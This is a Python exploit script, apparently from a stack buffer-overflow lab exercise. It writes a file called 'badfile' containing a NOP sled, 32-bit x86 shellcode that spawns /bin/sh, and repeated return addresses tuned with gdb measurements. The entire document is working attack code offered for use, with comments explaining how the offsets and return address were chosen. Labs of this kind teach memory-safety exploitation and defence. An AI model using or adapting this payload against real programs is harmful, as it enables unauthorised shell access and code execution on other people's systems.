#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(528)) 

##################################################################
#large NOP range, 192 arbitrarily set 
start = 192               
content[192:192 + len(shellcode)] = shellcode


# 0xffffd1f4 found with the smallest buffer size (i.e. 308-24), this is the value of &buffer found through gdb, 0x80 added to compensate for debugger. 
ret    =   0xffffd1f4 + 0x80  


L = 4     # Use 4 for 32-bit address and 8 for 64-bit address

# ($ebp - &buffer ) value was 452 for the smallest buffer size, 
# and 504 for the largest.
for i in range(456,508,4):
	content[i : i + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
